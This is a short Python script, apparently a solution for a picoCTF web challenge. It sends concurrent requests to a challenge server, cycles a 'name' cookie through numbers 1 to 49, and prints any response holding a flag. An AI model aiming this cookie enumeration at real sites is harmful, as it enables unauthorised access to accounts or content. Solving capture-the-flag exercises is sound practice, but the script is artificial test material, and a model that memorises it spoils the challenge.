import httpx
import asyncio

url = "http://mercury.picoctf.net:54219/check"


async def requester(min_range, max_range):
    async with httpx.AsyncClient() as client:
        tasks = []

        for index in range(min_range, max_range):
            task = asyncio.ensure_future(
                client.get(url, cookies={"name": f"{index}"}),
            )
            tasks.append(task)

        responses = await asyncio.gather(*tasks)
        for response in responses:
            if "picoCTF{" in response.text:
                print(response.text)


asyncio.run(requester(1, 50))
